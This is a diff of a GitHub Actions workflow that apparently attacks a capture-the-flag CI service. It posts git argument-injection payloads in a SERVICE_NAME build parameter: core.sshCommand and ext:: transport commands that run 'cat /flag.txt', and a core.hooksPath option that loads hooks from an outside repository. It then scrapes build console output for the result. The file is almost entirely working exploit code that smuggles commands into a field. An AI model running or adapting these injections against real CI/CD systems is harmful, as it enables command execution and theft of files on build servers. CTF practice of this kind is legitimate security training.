@@ -1,27 +1,32 @@
-﻿name: CTF Final Exploit
+name: CTF Get Flag v3
 on:
   push:
     branches: [ master ]
   workflow_dispatch:
-
 jobs:
-  exploit:
+  get-flag:
     runs-on: ubuntu-latest
     steps:
-      - name: Exploit hooksPath
+      - name: Fetch build 537 console (last success)
         run: |
-          PAYLOAD='--config core.hooksPath=hooks.git https://github.com/chilectf/exploit'
-          curl -sk -X POST 'https://gitops.ctfchile.com/job/deploy-service/buildWithParameters' --data-urlencode "SERVICE_NAME=$PAYLOAD" -D - | tail -5
+          echo "=== BUILD 537 CONSOLE ==="
+          curl -sk "https://gitops.ctfchile.com/job/deploy-service/537/console"
+
+      - name: Try working exploit - SSH URL with core.sshCommand
+        run: |
+          echo "=== SSH URL exploit ==="
+          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
+            --data-urlencode "SERVICE_NAME=--config=core.sshCommand=cat /flag.txt git@github.com:chilectf/exploit" \
+            -D - | tail -5
           sleep 8
           PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
           LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
           echo "Latest build: #$LATEST"
-          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console"
-      - name: Exploit ext protocol
+          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console" | grep -v "font-\|padding\|margin\|display\|color\|border\|background\|width\|height" | head -60
+
+      - name: Fetch recent consoles 538-544
         run: |
-          curl -sk -X POST 'https://gitops.ctfchile.com/job/deploy-service/buildWithParameters' --data-urlencode "SERVICE_NAME=ext::sh -c cat /flag.txt >&2" -D - | tail -5
-          sleep 8
-          PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
-          LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
-          echo "Latest build: #$LATEST"
-          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console"
+          for n in 538 539 540 541 542 543 544; do
+            echo "=== BUILD #$n ==="
+            curl -sk "https://gitops.ctfchile.com/job/deploy-service/$n/console" | grep -E "SERVICE|service|clone|flag|CTF|error|fatal|Error|post-checkout|hooks" | head -10
+          done
